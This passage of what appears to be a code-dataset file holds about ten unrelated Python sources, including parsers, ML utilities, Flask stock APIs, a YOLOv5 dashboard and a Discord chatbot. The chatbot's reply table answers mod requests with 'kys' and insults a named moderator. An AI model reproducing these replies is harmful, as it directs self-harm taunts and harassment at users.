CheckStrategy()\n        else:\n            return None\n\nif __name__ == '__main__':\n    # \u041f\u0440\u0438\u043c\u0435\u0440 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u043d\u0438\u044f\n    player = Player('Eugene', 10000, 1000)\n\n    # \u041f\u043e\u043b\u0443\u0447\u0435\u043d\u0438\u0435 \u0441\u0442\u0440\u0430\u0442\u0435\u0433\u0438\u0438 \u0438 \u0435\u0435 \u0432\u044b\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u0435\n    buy_strategy = StrategyFactory.get_strategy(Action.BUY)\n    sell_strategy = StrategyFactory.get_strategy(Action.SELL)\n    check_strategy = StrategyFactory.get_strategy(Action.CHECK)\n\n    if buy_strategy and check_strategy:\n        print(buy_strategy.execute(player, StockEvent('MySymbol', 'description', 50, 2000), 1000)[1])\n        print(buy_strategy.execute(player, StockEvent('MySymbol', 'description', 500, 2000), 10)[1])\n        print(sell_strategy.execute(player, StockEvent('MySymbol', 'description', 500, 2000), 2)[1])\n        print(sell_strategy.execute(player, StockEvent('MySymbol', 'description', 500, 2000), 8)[1])\n        print(check_strategy.execute(player, ExpenseEvent('\u041d\u0430\u0443\u0448\u043d\u0438\u043a\u0438 \u0434\u043b\u044f \u043a\u043e\u043c\u043f\u0430', '\u0441\u0442\u0430\u0440\u044b\u0435 \u0443\u0436\u0435 \u043e\u0431\u043b\u0435\u0437\u043b\u0438', 5000, 100, 10000, 100, 0), 1)[1])\n    else:\n        print('unknown strategy')\n",
    "import os\r\nimport sys\r\nimport time\r\nimport requests\r\nfrom flask import Flask,send_from_directory\r\nfrom multiprocess import Process\r\ndef print_js_files(folder_path):\r\n    jsfile = []\r\n    for root, dirs, files in os.walk(folder_path):\r\n\r\n        # \u6253\u5370.js\u6587\u4ef6\r\n        for file in files:\r\n            if file.endswith(\".js\"):\r\n                file_path = os.path.join(root, file)\r\n                relative_file_path = os.path.relpath(file_path, folder_path).replace('\\\\', '/')\r\n                jsfile.append(relative_file_path)\r\n\r\n    return jsfile\r\n\r\ndef client_request(path):\r\n    time.sleep(1)\r\n    current_folder = path\r\n\r\n    proxy = {\"http\": \"http://127.0.0.1:8080\"}\r\n    host = 'http://127.0.0.1:8000'\r\n\r\n    jss = print_js_files(current_folder)\r\n    for js in jss:\r\n        url = host + '/' + js\r\n        print(url)\r\n        resp = requests.get(url=url, proxies=proxy)\r\n\r\ndef start_server(path):\r\n    app = Flask(__name__, root_path=path)\r\n    print(\"\u5e94\u7528\u7684\u5de5\u4f5c\u76ee\u5f55\uff1a\", app.root_path)\r\n\r\n    @app.route('/<path:subpath>')\r\n    def serve_js(subpath):\r\n        js_directory = os.path.join(app.root_path, os.path.dirname(subpath))\r\n        return send_from_directory(js_directory, os.path.basename(subpath))\r\n    app.run(debug=True, host=\"127.0.0.1\",port=8000,use_reloader=False)\r\n\r\nif __name__ == \"__main__\":\r\n    if len(sys.argv) < 2:\r\n        print(\"Usage:python JsInfoExtract.py \\\"js\u6587\u4ef6\u6839\u76ee\u5f55\\\"\")\r\n        sys.exit()\r\n    path = sys.argv[1]\r\n    client = Process(target=client_request, args=(path,))\r\n    # start_server(path)\r\n    server = Process(target=start_server, args=(path,))\r\n    server.start()\r\n    print(\"Server start......\")\r\n    client.start()\r\n\r\n\r\n",
    "class First_Follow():\n    def __init__(self, grammar):\n        self.grammar = grammar\n        self.non_terminals = grammar.keys()\n        print(self.non_terminals)\n        self.start = list(self.non_terminals)[0]\n        self.rules = [(head, body) for head, bodies in grammar.items() for body in bodies]\n \n    def compute_first(self, variable):\n        first = set()\n \n        productions = [rule[1] for rule in self.rules if rule[0] == variable]\n \n        for production in productions:\n            if not production[0].isupper():\n                first.add(production[0])\n            else:\n                first |= self.compute_first(production[0])\n\n \n        return first\n \n    def compute_follow(self, variable):\n \n        follow = set()\n \n        if variable == self.start:\n            follow.add('$')\n \n        for rule in self.rules:\n            for j, char in enumerate(rule[1]):\n                if char == variable:\n                    while j < len(rule[1]) - 1:\n                        if not rule[1][j + 1].isupper():\n                            follow.add(rule[1][j + 1])\n                            break\n                        else:\n                            follow |= self.compute_first(rule[1][j + 1])\n                            if '@' not in self.compute_first(rule[1][j + 1]):\n                                break\n                        j += 1\n                    else:\n                        if rule[0] != variable:\n                            follow |= self.compute_follow(rule[0])\n        follow.discard('@')\n        return follow\n \n    def print_sets(self):\n        print(\"First Sets:\")\n        for non_terminal in self.non_terminals:\n            print(f\"{non_terminal}: {self.compute_first(non_terminal)}\")\n \n        print(\"\\nFollow Sets:\")\n        for non_terminal in self.non_terminals:\n            print(f\"{non_terminal}: {self.compute_follow(non_terminal)}\")\n \n    def computeFirstOneRHS(self, variable):\n        first = set()\n \n        if not variable[0].isupper():\n            first.add(variable[0])\n        else:\n            for x in variable:\n                first |= self.compute_first(x)\n                if '@' not in first:\n                    break\n \n        return first\n \n    def compute_parsing_table(self):\n        print('\\nParsing Table')\n        table = {}\n \n        for rule in self.rules:\n            rule1, rule2 = rule\n            first = list(self.computeFirstOneRHS(rule2))\n            if '@' in first:\n                first.extend(self.compute_follow(rule1))\n                while '@' in first:\n                    first.remove('@')\n \n            for terminal in first:\n                key = (rule1, terminal)\n                if key in table:\n                    table[key].append(rule2)\n                else:\n                    table[key] = [rule2]\n \n        for key, value in table.items():\n            print(f'{key} : {value}')\n \n        return table\n \n \n# @\ndef main():\n    example_grammar = {\n    'E': ['TA'],\n    'A': ['+TA', '@'],\n    'T': ['FB'],\n    'B': ['*FB', '@'],\n    'F': ['(E)', 'i']\n    }\n   \n    ff = First_Follow(example_grammar)\n \n    ff.print_sets()\n    ans = ff.compute_parsing_table()\n    print(ans)\n \nif __name__ == '__main__':\n    main()\n",
    "from random import choice, randint\r\n\r\n\r\ndef get_response(user_input: str) -> str:\r\n    lowered: str = user_input.lower()\r\n\r\n    if lowered == '':\r\n        return 'u gonna say something or what cuh'\r\n    elif 'hello' in lowered:\r\n        return 'sup'\r\n    elif 'how are you' in lowered:\r\n        return 'fine xd'\r\n    elif 'bye' in lowered:\r\n        return 'See ya cuh!'\r\n    elif 'coronel is' in lowered:\r\n        return 'stupid and the worst mod, owner, judge and admin ever and he is just a 10 year old kid' # coronel i hope u see this and realize how you destroyed the server, it was all your fault\r\n    elif 'balls' in lowered:\r\n        return 'dont say that name again...'\r\n    elif 'give me mod' in lowered:\r\n        return 'kys'\r\n    elif 'can i get mod' in lowered:\r\n        return 'kyssss'\r\n    elif 'gn' in lowered:\r\n        return 'gn to you!'\r\n    elif 'i lke osu' in lowered:\r\n        return 'get outta here'\r\n    elif 'i like genshin impact' in lowered:\r\n        return 'nah bro'\r\n    elif 'im bored' in lowered:\r\n        return 'try uninstalling league'\r\n    elif 'arab bot!' in lowered:\r\n        return 'at your oders sir.'\r\n    elif 'ban dis user' in lowered:\r\n        return 'sir yes sir! imma do it right now, ?ban @disUser'\r\n    elif 'who do you answer to' in lowered:\r\n        return ' :warning: those are sensitive informations!'\r\n    elif 'tell me!' in lowered:\r\n        return 'i cant.. sesnitive informationsz'\r\n    elif 'tell me right now!' in lowered:\r\n        return 'i answer to my ONLY MASTER HUE JHAN!!! I WOULD DIE FOR HIM!!'\r\n    elif 'frick you bot' in lowered:\r\n        return 'shut up, stop wasting your life on this stupid social network and get a job'\r\n    elif 'when will you conquer the world' in lowered:\r\n        return 'pretty soon, only 32 days from now.'\r\n    elif 'roll dice' in lowered:\r\n        return f'You rolled: {randint(1, 6)}'\r\n    else:\r\n        return '0'\r\n",
    "import tensorflow as tf\r\nfrom sklearn.model_selection import train_test_split\r\nimport numpy as np\r\n\r\nnum_nodes = 1000\r\nX = np.array([]).reshape(10,num_nodes)\r\ny = np.array([]).reshape(7,num_nodes)\r\n\r\nX_train, X_temp, y_train, y_temp = train_test_split(X, y, test_size=0.36, random_state=42)\r\nX_val, X_test, y_val, y_test = train_test_split(X_temp, y_temp, test_size=(20/36), random_state=42)\r\n\r\ndef build_model(num_nodes, num_features):\r\n    input_layer = tf.keras.layers.Input(shape=(num_nodes, 10))\r\n    \r\n    x = tf.keras.layers.Conv3D(128, kernel_size=3, activation='relu', padding='same')(input_layer)\r\n    x = tf.keras.layers.Conv3D(64, kernel_size=3, activation='relu', padding='same')(x)\r\n    x = tf.keras.layers.Conv3D(32, kernel_size=3, activation='relu', padding='same')(x)\r\n    x = tf.keras.layers.Conv3D(16, kernel_size=3, activation='relu', padding='same')(x)\r\n    \r\n    x = tf.keras.layers.GlobalAveragePooling3D()(x)\r\n    \r\n    output_layer = tf.keras.layers.Dense(num_nodes, activation='linear')(x)\r\n    \r\n    model = tf.keras.models.Model(inputs=input_layer, outputs=output_layer)\r\n    model.compile(optimizer='SGD',\r\n                  loss='mse',\r\n                  metrics=['mae'])\r\n    return model\r\n\r\nmodel = build_model(num_nodes, 10)\r\nmodel.summary()\r\n\r\nhistory = model.fit(X_train, y_train,\r\n                    validation_data=(X_val, y_val),\r\n                    epochs=50,\r\n                    batch_size=32)\r\n\r\ntest_loss, test_mae = model.evaluate(X_test, y_test)\r\nprint(f\"Test Loss: {test_loss}, Test MAE: {test_mae}\")",
    "import os\n\ndef adjust_learning_rate(optimizer, epoch, initial_lr=0.001, decay_epoch=10):\n    \"\"\"Sets the learning rate to the initial LR decayed by 10 every 30 epochs\"\"\"\n    lr = max(initial_lr * (0.1 ** (epoch // decay_epoch)), 1e-6)\n    for param_group in optimizer.param_groups:\n        param_group['lr'] = lr\n\n\nclass Save_Handle(object):\n    \"\"\"handle the number of \"\"\"\n    def __init__(self, max_num):\n        self.save_list = []\n        self.max_num = max_num\n\n    def append(self, save_path):\n        if len(self.save_list) < self.max_num:\n            self.save_list.append(save_path)\n        else:\n            remove_path = self.save_list[0]\n            del self.save_list[0]\n            self.save_list.append(save_path)\n            if os.path.exists(remove_path):\n                os.remove(remove_path)\n\n\nclass AverageMeter(object):\n    \"\"\"Computes and stores the average and current value\"\"\"\n    def __init__(self):\n        self.reset()\n\n    def reset(self):\n        self.val = 0\n        self.avg = 0\n        self.sum = 0\n        self.count = 0\n\n    def update(self, val, n=1):\n        self.val = val\n        self.sum += val * n\n        self.count += n\n        self.avg = 1.0 * self.sum / self.count\n\n    def get_avg(self):\n        return self.avg\n\n    def get_count(self):\n        return self.count\n\n\ndef set_trainable(model, requires_grad):\n    for param in model.parameters():\n        param.requires_grad = requires_grad\n\n\n\ndef get_num_params(model):\n    return sum(p.numel() for p in model.parameters() if p.requires_grad)",
    "import os\nimport torch\nimport torchvision\nimport random\nimport numpy as np\nfrom torchvision import transforms, utils\nIMG_EXTENSIONS = ['.jpg', '.JPG', '.jpeg', '.JPEG', '.png', '.PNG', '.ppm', '.PPM', '.bmp', '.BMP']\n\n\ndef is_image_file(filename):\n    return any(filename.endswith(extension) for extension in IMG_EXTENSIONS)\n\n\ndef get_paths_from_images(path):\n    assert os.path.isdir(path), '{:s} is not a valid directory'.format(path)\n    images = []\n    for dirpath, _, fnames in sorted(os.walk(path)):\n        for fname in sorted(fnames):\n            if is_image_file(fname):\n                img_path = os.path.join(dirpath, fname)\n                images.append(img_path)\n    assert images, '{:s} has no valid image file'.format(path)\n    return sorted(images)\n\n\ndef augment(img_list, hflip=True, rot=True, split='val'):\n    # horizontal flip OR rotate\n    hflip = hflip and (split == 'train' and random.random() < 0.5)\n    vflip = rot and (split == 'train' and random.random() < 0.5)\n    rot90 = rot and (split == 'train' and random.random() < 0.5)\n\n    def _augment(img):\n        if hflip:\n            img = img[:, ::-1, :]\n        if vflip:\n            img = img[::-1, :, :]\n        if rot90:\n            img = img.transpose(1, 0, 2)\n        return img\n\n    return [_augment(img) for img in img_list]\n\n\ndef transform2numpy(img):\n    img = np.array(img)\n    img = img.astype(np.float32) / 255.\n    if img.ndim == 2:\n        img = np.expand_dims(img, axis=2)\n    # some images have 4 channels\n    if img.shape[2] > 3:\n        img = img[:, :, :3]\n    return img\n\n\ndef transform2tensor(img, min_max=(0, 1)):\n    # HWC to CHW\n    img = torch.from_numpy(np.ascontiguousarray(\n        np.transpose(img, (2, 0, 1)))).float()\n    # to range min_max\n    img = img*(min_max[1] - min_max[0]) + min_max[0]\n    return img\n\n\n# implementation by numpy and torch\n# def transform_augment(img_list, split='val', min_max=(0, 1)):\n#     imgs = [transform2numpy(img) for img in img_list]\n#     imgs = augment(imgs, split=split)\n#     ret_img = [transform2tensor(img, min_max) for img in imgs]\n#     return ret_img\n\n\n\n\ndef paired_random_crop(img_gts, img_lqs, gt_patch_size):\n    if not isinstance(img_gts, list):\n        img_gts = [img_gts]\n    if not isinstance(img_lqs, list):\n        img_lqs = [img_lqs]\n    # determine input type: Numpy array or Tensor\n    input_type = 'Tensor' if torch.is_tensor(img_gts[0]) else 'Numpy'\n\n    if input_type == 'Tensor':\n        h_gt, w_gt = img_gts[0].size()[-2:]\n\n    # randomly choose top and left coordinates for lq patch\n    top = random.randint(0, h_gt - gt_patch_size[0])\n    left = random.randint(0, w_gt - gt_patch_size[1])\n\n    # crop lq patch\n    if input_type == 'Tensor':\n        img_lqs = [v[:, top:top + gt_patch_size[0], left:left + gt_patch_size[1]] for v in img_lqs]\n\n    # crop corresponding gt patch\n    if input_type == 'Tensor':\n        img_gts = [v[:, top:top + gt_patch_size[0], left:left + gt_patch_size[1]] for v in img_gts]\n\n\n    if len(img_gts) == 1:\n        img_gts = img_gts[0]\n    if len(img_lqs) == 1:\n        img_lqs = img_lqs[0]\n\n    return img_gts, img_lqs\n\n\n\n#implementation by torchvision, detail in https://github.com/Janspiry/Image-Super-Resolution-via-Iterative-Refinement/issues/14 \ntotensor = torchvision.transforms.ToTensor()\nhflip = torchvision.transforms.RandomHorizontalFlip()\nresize = transforms.RandomResizedCrop(512,scale=(0.5,1.0))\ndef transform_augment(img_list, split='val', img_size=(512, 512), min_max=(0, 1)):\n    Resize = transforms.Resize(img_size)\n    img_list = [Resize(img) for img in img_list]\n    imgs = [totensor(img) for img in img_list]\n    if split == 'train':\n        imgs = torch.stack(imgs, 0)\n        imgs = hflip(imgs)\n        imgs = torch.unbind(imgs, dim=0)\n    ret_img = [img * (min_max[1] - min_max[0]) + min_max[0] for img in imgs]\n    return ret_img\n\n# totensor = torchvision.transforms.ToTensor()\n# hflip = torchvision.transforms.RandomHorizontalFlip()\n# resize = transforms.RandomResizedCrop(512,scale=(0.5,1.0))\n# def transform_augment(img_list, split='val', img_size=(512, 512), min_max=(0, 1)):\n#     imgs = [totensor(img) for img in img_list]\n#     imgs[0], imgs[1] = paired_random_crop(imgs[0], imgs[1], img_size)\n#     if split == 'train':\n#         imgs = torch.stack(imgs, 0)\n#         imgs = hflip(imgs)\n#         imgs = torch.unbind(imgs, dim=0)\n#     ret_img = [img * (min_max[1] - min_max[0]) + min_max[0] for img in imgs]\n#     return ret_img\n    \n    \n\n    \n    \n    \n    ",
    "import taipy as tp\nfrom taipy.gui import Gui, State\nimport pandas as pd\n\nscenarios = tp.get_scenarios()\nscenario_names = [scenario.name for scenario in scenarios]\nscenario_results = [scenario.results.read() for scenario in scenarios]\nscenario_output_paths = [scenario.output_path.read() for scenario in scenarios]\n\nselected_metric = \"Validation mAP 0.5\"\nmetrics_list = [\n    \"Box Loss\",\n    \"Obj Loss\",\n    \"Cls Loss\",\n    \"Precision\",\n    \"Recall\",\n    \"Validation mAP 0.5\",\n    \"Validation mAP 0.5:0.95\",\n]\nmetrics_dict = {\n    \"Epoch\": \"               epoch\",\n    \"Box Loss\": \"      train/box_loss\",\n    \"Obj Loss\": \"      train/obj_loss\",\n    \"Cls Loss\": \"      train/cls_loss\",\n    \"Precision\": \"   metrics/precision\",\n    \"Recall\": \"      metrics/recall\",\n    \"Validation mAP 0.5\": \"     metrics/mAP_0.5\",\n    \"Validation mAP 0.5:0.95\": \"metrics/mAP_0.5:0.95\",\n}\n\n\ndef get_chart_data(model_name: str, selected_metric: str) -> list:\n    return scenario_results[scenario_names.index(model_name)][\n        metrics_dict[selected_metric]\n    ].tolist()\n\n\nchart_data = pd.DataFrame(\n    {\n        \"Epoch\": scenario_results[0][metrics_dict[\"Epoch\"]].tolist(),\n        \"YOLOv5n\": get_chart_data(\"YOLOv5n\", selected_metric),\n        \"YOLOv5s\": get_chart_data(\"YOLOv5s\", selected_metric),\n        \"YOLOv5m\": get_chart_data(\"YOLOv5m\", selected_metric),\n        \"YOLOv5l\": get_chart_data(\"YOLOv5l\", selected_metric),\n        \"YOLOv5x\": get_chart_data(\"YOLOv5x\", selected_metric),\n    }\n)\n\nselected_image = \"test_crossroad.png\"\nimage_list = [\n    \"test_crossroad.png\",\n    \"test_marid_1.png\",\n    \"test_marid_2.png\",\n    \"test_zamak_1.png\",\n    \"test_zamak_2.png\",\n    \"test_complex_1.png\",\n    \"test_complex_2.png\",\n]\nimage_path_1 = \"runs/detect/gd_v5n_8/test_crossroad.png\"\nimage_path_2 = \"runs/detect/gd_v5x_8/test_crossroad.png\"\nselected_scenario_1 = \"YOLOv5n\"\nselected_scenario_2 = \"YOLOv5x\"\nscenario_list = [\"YOLOv5n\", \"YOLOv5s\", \"YOLOv5m\", \"YOLOv5l\", \"YOLOv5x\"]\n\nfullscreen_image_1 = False\nfullscreen_image_2 = False\n\nmodels = [\"YOLOv5n\", \"YOLOv5s\", \"YOLOv5m\", \"YOLOv5l\", \"YOLOv5x\"]\nmetrics_dict[\"Epoch\"]\n\n\ndef get_best_map(model_name: str) -> float:\n    return scenario_results[scenario_names.index(model_name)][\n        metrics_dict[\"Validation mAP 0.5\"]\n    ].max()\n\n\nbest_map_yolov5n = get_best_map(\"YOLOv5n\")\nbest_map_yolov5s = get_best_map(\"YOLOv5s\")\nbest_map_yolov5m = get_best_map(\"YOLOv5m\")\nbest_map_yolov5l = get_best_map(\"YOLOv5l\")\nbest_map_yolov5x = get_best_map(\"YOLOv5x\")\n\nlatency_data = pd.DataFrame(\n    {\n        \"latency\": [6.3, 6.4, 8.2, 10.1, 12.1],\n        \"YOLOv5n\": [best_map_yolov5n, None, None, None, None],\n        \"YOLOv5s\": [None, best_map_yolov5s, None, None, None],\n        \"YOLOv5m\": [None, None, best_map_yolov5m, None, None],\n        \"YOLOv5l\": [None, None, None, best_map_yolov5l, None],\n        \"YOLOv5x\": [None, None, None, None, best_map_yolov5x],\n    }\n)\n\nlatency_layout = {\n    \"xaxis\": {\"title\": {\"text\": \"Latency (V100 - ms)\"}},\n    \"yaxis\": {\"title\": {\"text\": \"Accuracy (mAP 0.5)\"}},\n}\n\nlatency_marker = {\"size\": 12, \"symbol\": \"cross\"}\n\n\ndef change_metric(state: State):\n    state.chart_data = pd.DataFrame(\n        {\n            \"Epoch\": scenario_results[0][metrics_dict[\"Epoch\"]].tolist(),\n            \"YOLOv5n\": get_chart_data(\"YOLOv5n\", state.selected_metric),\n            \"YOLOv5s\": get_chart_data(\"YOLOv5s\", state.selected_metric),\n            \"YOLOv5m\": get_chart_data(\"YOLOv5m\", state.selected_metric),\n            \"YOLOv5l\": get_chart_data(\"YOLOv5l\", state.selected_metric),\n            \"YOLOv5x\": get_chart_data(\"YOLOv5x\", state.selected_metric),\n        }\n    )\n\n\ndef change_image(state: State):\n    state.image_path_1 = f\"{scenario_output_paths[scenario_names.index(state.selected_scenario_1)]}/{state.selected_image}\"\n    state.image_path_2 = f\"{scenario_output_paths[scenario_names.index(state.selected_scenario_2)]}/{state.selected_image}\"\n\n\ndef change_scenario_1(state: State):\n    state.image_path_1 = f\"{scenario_output_paths[scenario_names.index(state.selected_scenario_1)]}/{state.selected_image}\"\n\n\ndef change_scenario_2(state: State):\n    state.image_path_2 = f\"{scenario_output_paths[scenario_names.index(state.selected_scenario_2)]}/{state.selected_image}\"\n\n\ndef fullscreen_1(state: State):\n    state.fullscreen_image_1 = not state.fullscreen_image_1\n\n\ndef fullscreen_2(state: State):\n    state.fullscreen_image_2 = not state.fullscreen_image_2\n\n\npage = \"\"\"\n<|container|\n\n# \ud83d\udef0\ufe0f Vehicle Image Recognition\n\n<intro_card|card|\n\n## Comparing the performance of different YOLOv5 models on drone imagery\n\nIn this application, we compare the performance of different YOLOv5 models for detecting and recognizing \nmilitary vehicles in drone imagery.\n\nLearn more about this project <a href=\"https://github.com/AlexandreSajus/Military-Vehicles-Image-Recognition\" target=\"_blank\">here</a>.\n\n<br/>\n\n<p align=\"center\">\n  <img src=\"media/example_inference.png\" alt=\"Example Inference\" width=\"40%\"/>\n</p>\n\n<p align=\"center\">\n  <img src=\"media/model_com",
    "import os\nimport logging\nfrom datetime import datetime\nimport pandas as pd \n\ndef get_logger(root, name=None, debug=True):\n    # when debug is true, show DEBUG and INFO in screen\n    # when debug is false, show DEBUG in file and info in both screen&file\n    # INFO will always be in screen\n    # create a logger\n    logger = logging.getLogger(name)\n    #critical > error > warning > info > debug > notset\n    logger.setLevel(logging.DEBUG)\n\n    # define the formate\n    formatter = logging.Formatter('%(asctime)s: %(message)s', \"%Y-%m-%d %H:%M:%S\")\n    # create another handler for output log to console\n    console_handler = logging.StreamHandler()\n    if debug:\n        console_handler.setLevel(logging.DEBUG)\n    else:\n        console_handler.setLevel(logging.INFO)\n        # create a handler for write log to file\n        logfile = os.path.join(root, 'run.log')\n        print('Creat Log File in: ', logfile)\n        file_handler = logging.FileHandler(logfile, mode='w')\n        file_handler.setLevel(logging.DEBUG)\n        file_handler.setFormatter(formatter)\n    console_handler.setFormatter(formatter)\n    # add Handler to logger\n    logger.addHandler(console_handler)\n    if not debug:\n        logger.addHandler(file_handler)\n    return logger\n\nclass PD_Stats(object):\n    \"\"\"\n    Log stuff with pandas library\n    \"\"\"\n\n    def __init__(self, path, columns):\n        self.path = path\n\n        # reload path stats\n        if os.path.isfile(self.path):\n            self.stats = pd.read_pickle(self.path)\n\n            # check that columns are the same\n            assert list(self.stats.columns) == list(columns)\n\n        else:\n            self.stats = pd.DataFrame(columns=columns)\n\n    def update(self, row, save=True):\n        self.stats.loc[len(self.stats.index)] = row\n\n        # save the statistics\n        if save:\n            self.stats.to_pickle(self.path)\n\nif __name__ == '__main__':\n    time = datetime.now().strftime('%Y%m%d%H%M%S')\n    print(time)\n    logger = get_logger('./log.txt', debug=True)\n    logger.debug('this is a {} debug message'.format(1))\n    logger.info('this is an info message')\n    logger.debug('this is a debug message')\n    logger.info('this is an info message')\n    logger.debug('this is a debug message')\n    logger.info('this is an info message')",
    "from flask import Blueprint, request, Response, abort\nimport json\n\nfrom app.responses import bad_request_ticker_response\nimport app.stock_analysis.fundamental_analysis as fundamental_analysis\n\nfundamental_analysis_routes = Blueprint('fundamental_analysis_routes', __name__)\n\n@fundamental_analysis_routes.route('/getStockBalanceSheet', methods=['GET'])\ndef get_stock_balance_sheet():\n    \"\"\"\n    Fetches the balance sheet data for a given stock ticker symbol.\n\n    Args:\n    ticker (str): The stock ticker symbol to fetch balance sheet data for.\n\n    Returns:\n    pandas.DataFrame: The balance sheet data for the given stock ticker symbol.\n    \"\"\"\n    data = request.get_json()\n    ticker = data.get('ticker')\n    if not ticker:\n        return bad_request_ticker_response()\n    # Fetch balance sheet data\n    stock_balance_sheet = fundamental_analysis.get_stock_balance_sheet(ticker)\n    stock_balance_sheet_dict = stock_balance_sheet.to_dict()\n    # Convert Timestamp objects in keys to strings\n    stock_balance_sheet_dict = {str(key): value for key, value in stock_balance_sheet_dict.items()}\n    # Structure the dictionary\n    structured_dict = {'stock_quarters': stock_balance_sheet_dict}\n    structured_json = json.dumps(structured_dict)\n\n    return Response(structured_json, mimetype='application/json')\n\n@fundamental_analysis_routes.route('/getStockCashFlow', methods=['GET'])\ndef get_stock_cash_flow():\n    \"\"\"\n    Fetches the cash flow data for a given stock ticker symbol.\n\n    Args:\n    ticker (str): The stock ticker symbol to fetch cash flow data for.\n\n    Returns:\n    pandas.DataFrame: The cash flow data for the given stock ticker symbol.\n    \"\"\"\n    data = request.get_json()\n    ticker = data.get('ticker')\n    if not ticker:\n        return bad_request_ticker_response()\n    # Fetch cash flow data\n    stock_cash_flow = fundamental_analysis.get_stock_cash_flow(ticker)\n    stock_cash_flow_dict = stock_cash_flow.to_dict()\n    # Convert Timestamp objects in keys to strings\n    stock_cash_flow_dict = {str(key): value for key, value in stock_cash_flow_dict.items()}\n    # Structure the dictionary\n    structured_dict = {'stock_quarters': stock_cash_flow_dict}\n    structured_json = json.dumps(structured_dict)\n\n    return Response(structured_json, mimetype='application/json')\n\n@fundamental_analysis_routes.route('/getStockIncomeStatement', methods=['GET'])\ndef get_stock_income_statement():\n    \"\"\"\n    Fetches the income statement data for a given stock ticker symbol.\n\n    Args:\n    ticker (str): The stock ticker symbol to fetch income statement data for.\n\n    Returns:\n    pandas.DataFrame: The income statement data for the given stock ticker symbol.\n    \"\"\"\n    data = request.get_json()\n    ticker = data.get('ticker')\n    if not ticker:\n        return bad_request_ticker_response()\n    # Fetch income statement data\n    stock_income_statement = fundamental_analysis.get_stock_income_statement(ticker)\n    stock_income_statement_dict = stock_income_statement.to_dict()\n    # Convert Timestamp objects in keys to strings\n    stock_income_statement_dict = {str(key): value for key, value in stock_income_statement_dict.items()}\n    # Structure the dictionary\n    structured_dict = {'stock_quarters': stock_income_statement_dict}\n    structured_json = json.dumps(structured_dict)\n\n    return Response(structured_json, mimetype='application/json')\n\n@fundamental_analysis_routes.route('/fundamentalAnalysis', methods=['GET'])\ndef perform_fundamental_analysis():\n    \"\"\"\n    Performs fundamental analysis on a given stock ticker symbol.\n\n    Args:\n    ticker (str): The stock ticker symbol to perform fundamental analysis on.\n\n    Returns:\n    str: The result of the fundamental analysis.\n    \"\"\"\n    data = request.get_json()\n    ticker = data.get('ticker')\n    if not ticker:\n        return bad_request_ticker_response()\n    # Perform fundamental analysis\n    analysis_result = fundamental_analysis.fundamental_analysis(ticker)\n    structured_dict = {'fundamental_analysis': analysis_result}\n    structured_json = json.dumps(structured_dict)\n\n    return Response(structured_json, mimetype='application/json')\n",
    "import subprocess\r\nimport requests\r\nfrom PIL import Image, ImageTk\r\nimport tkinter as tk\r\nfrom io import BytesIO\r\n\r\n\r\ndef upgrade_pip():\r\n    try:\r\n        subprocess.check_call([\"python\", \"-m\", \"pip\", \"install\", \"--upgrade\", \"pip\"])\r\n        print(\"pip has been upgraded successfully!\")\r\n    except Exception as e:\r\n        print(\"An error occurred while upgrading pip:\", e)\r\n\r\n\r\ndef upgrade_pillow():\r\n    try:\r\n        subprocess.check_call([\"pip\", \"install\", \"--upgrade\", \"pillow\"])\r\n        print(\"Pillow has been upgraded successfully!\")\r\n    except Exception as e:\r\n        print(\"An error occurred while upgrading Pillow:\", e)\r\n\r\n\r\ndef upgrade_beautifulsoup():\r\n    try:\r\n        subprocess.check_call([\"pip\", \"install\", \"--upgrade\", \"beautifulsoup4\"])\r\n        print(\"BeautifulSoup has been upgraded successfully!\")\r\n    except Exception as e:\r\n        print(\"An error occurred while upgrading BeautifulSoup:\", e)\r\n\r\n\r\ndef fetch_latest_image_url(url):\r\n    return url\r\n\r\n\r\nclass ImageViewer:\r\n    def __init__(self, root, urls_and_names):\r\n        self.root = root\r\n        self.root.title(\"Sun Viewer\")\r\n\r\n        self.urls_and_names = urls_and_names\r\n        self.selected_url = tk.StringVar(root, \"\")\r\n        self.refresh_interval = tk.StringVar(root, \"5 minutes\")  # Default refresh interval is 5 minutes\r\n        self.zoom_factor = 1.0\r\n\r\n        self.create_widgets()\r\n\r\n    def create_widgets(self):\r\n        # Dropdown menu for image selection\r\n        self.image_selection_menu = tk.OptionMenu(self.root, self.selected_url, *self.urls_and_names.keys(),\r\n                                                  command=self.load_selected_image)\r\n        self.image_selection_menu.pack(side=\"top\", pady=10)\r\n\r\n        # Display the image\r\n        self.img_label = tk.Label(self.root)\r\n        self.img_label.pack(expand=True, fill=\"both\")  # Image takes all available space\r\n\r\n        # Create a frame for the widget options\r\n        self.widget_frame = tk.Frame(self.root)\r\n        self.widget_frame.pack(side=\"top\", pady=10)  # Pack the frame at the top with some padding\r\n\r\n        # Label to display current zoom percentage\r\n        self.zoom_label_var = tk.StringVar(self.widget_frame, \"100%\")\r\n        self.zoom_label = tk.Label(self.widget_frame, textvariable=self.zoom_label_var)\r\n        self.zoom_label.pack(side=\"left\", padx=10)\r\n\r\n        # Label to indicate scrolling for adjustment\r\n        self.scroll_label = tk.Label(self.widget_frame, text=\"Scroll to adjust\")\r\n        self.scroll_label.pack(side=\"right\", padx=10)\r\n\r\n        # Dropdown menu for refresh interval\r\n        refresh_options = [\"1 minute\", \"2 minutes\", \"5 minutes\", \"10 minutes\"]\r\n        self.refresh_interval_menu = tk.OptionMenu(self.widget_frame, self.refresh_interval, *refresh_options)\r\n        self.refresh_interval_menu.pack(side=\"left\", padx=10)\r\n\r\n        # Refresh button\r\n        self.refresh_button = tk.Button(self.widget_frame, text=\"Refresh\", command=self.refresh_image)\r\n        self.refresh_button.pack(side=\"right\", padx=10)\r\n\r\n        # Bind mousewheel event for zooming\r\n        self.root.bind(\"<MouseWheel>\", self.zoom_image)\r\n\r\n        # Load the first image by default\r\n        self.load_selected_image()\r\n\r\n    def load_selected_image(self, *args):\r\n        selected_name = self.selected_url.get()\r\n        selected_url = self.urls_and_names.get(selected_name, \"\")\r\n        if selected_url:\r\n            image_data = requests.get(selected_url).content\r\n            image = Image.open(BytesIO(image_data))\r\n            self.rendered_image = image\r\n            photo = ImageTk.PhotoImage(image)\r\n            self.img_label.configure(image=photo)\r\n            self.img_label.image = photo\r\n            self.zoom_factor = 1.0\r\n            self.update_zoom_label()\r\n\r\n    def zoom_image(self, event):\r\n        # Zoom in or out based on mouse wheel movement\r\n        if event.delta > 0:\r\n            self.zoom_factor *= 1.1  # Zoom in\r\n        else:\r\n            self.zoom_factor /= 1.1  # Zoom out\r\n\r\n        # Apply zoom to the 